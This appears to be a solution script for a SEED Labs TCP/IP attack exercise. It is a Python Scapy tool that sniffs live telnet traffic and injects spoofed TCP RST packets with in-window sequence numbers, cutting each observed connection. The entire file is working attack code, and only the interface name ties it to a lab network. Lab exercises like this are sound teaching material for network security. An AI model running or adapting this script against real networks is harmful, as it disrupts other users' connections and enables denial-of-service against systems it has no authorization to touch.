#!/usr/bin/env python3
"""
Task 2: TCP RST Attack on telnet Connections (Automatic)
SEED Labs - TCP/IP Attack Lab

This script automatically sniffs live telnet traffic and sends a spoofed
TCP RST packet to break the connection as soon as a packet is observed.

Usage:
    sudo python3 rst_attack_auto.py
"""

from scapy.all import *
import sys

IFACE    = "br-983f4e838608"   # Docker bridge interface for container network
FILTER   = "tcp and port 23"   # capture only telnet traffic


def send_rst(pkt):
    """Send a spoofed RST packet in response to a sniffed telnet packet.

    For a RST to be accepted by the receiver, the sequence number must
    fall within the receiver's current window.  We spoof a RST that
    appears to come from the client toward the server, using the
    client's next expected sequence number (seq + payload length of the
    sniffed client→server packet) so it is within the server's window.
    """
    try:
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return

        ip_layer  = pkt[IP]
        tcp_layer = pkt[TCP]

        # Only act on packets going FROM the client TO the server (port 23)
        if tcp_layer.dport != 23:
            return

        # Advance seq past any payload already in the sniffed packet so the
        # RST is positioned at the server's expected next byte.
        payload_len = len(tcp_layer.payload) if tcp_layer.payload else 0
        rst_seq = tcp_layer.seq + payload_len

        # Build spoofed RST from the client side toward the server
        ip  = IP(src=ip_layer.src, dst=ip_layer.dst)
        tcp = TCP(
            sport=tcp_layer.sport,
            dport=tcp_layer.dport,
            flags="R",
            seq=rst_seq,
        )
        rst_pkt = ip / tcp
        send(rst_pkt, verbose=0)
        print(f"[+] RST sent: {ip_layer.src}:{tcp_layer.sport} -> "
              f"{ip_layer.dst}:{tcp_layer.dport}  seq={rst_seq}")
    except Exception as e:
        print(f"[-] Error sending RST: {e}", file=sys.stderr)


if __name__ == "__main__":
    print(f"[*] Starting TCP RST attack on interface {IFACE}")
    print(f"[*] Filter: {FILTER}")
    print("[*] Waiting for telnet traffic...")
    try:
        sniff(iface=IFACE, filter=FILTER, prn=send_rst, store=False)
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        sys.exit(1)
